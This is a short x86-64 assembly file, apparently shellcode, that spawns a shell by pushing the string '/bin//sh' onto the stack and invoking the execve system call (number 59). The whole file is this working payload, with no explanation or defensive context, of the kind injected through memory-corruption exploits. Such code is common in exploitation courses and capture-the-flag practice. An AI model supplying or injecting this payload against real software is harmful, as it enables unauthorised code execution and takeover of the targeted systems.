BITS 64

global _start

section .text

_start:
        push rax
        xor rdx, rdx
        xor rsi, rsi
        mov rbx,'/bin//sh'
        push rbx
        push rsp
        pop rdi
        mov al, 59
        syscall
